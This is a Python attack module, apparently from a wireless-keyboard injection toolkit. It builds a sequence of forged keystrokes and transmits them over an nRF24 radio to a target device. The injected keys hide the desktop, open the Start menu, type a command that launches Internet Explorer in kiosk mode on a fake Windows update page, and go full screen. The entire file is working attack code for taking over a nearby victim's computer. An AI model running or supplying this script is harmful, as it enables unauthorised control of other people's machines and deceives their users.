from __future__ import print_function, absolute_import
import time
from tools import Scanner
from lib import nrf24_reset, nrf24, payload_keys
from attacks import add_payload


class FakeUpdate_attack:

    def __init__(self, address, radio=nrf24.nrf24(0)):
        self.radio = radio
        self.address = address
        self.payloads_list = []

    def init_list(self):
        self.payloads_list.append(payload_keys.payload_keys('init'))
        add_payload.KeyPL(self.payloads_list, 'hideDesktop')
        add_payload.wait(self.payloads_list, 1)
        add_payload.KeyPL(self.payloads_list, 'ctrl+esc')
        add_payload.wait(self.payloads_list, 1)
        add_payload.StringPL(self.payloads_list, 'iexplore -k  https://fakeupdate.net/win10ue/')
        add_payload.KeyPL(self.payloads_list, 'ENTER')
        add_payload.wait(self.payloads_list, 2)
        add_payload.KeyPL(self.payloads_list, 'F11')

    def run(self):
        self.init_list()
        for i in self.payloads_list:
            self.radio.transmit_payload(i)
            time.sleep(12 / 1000.0)
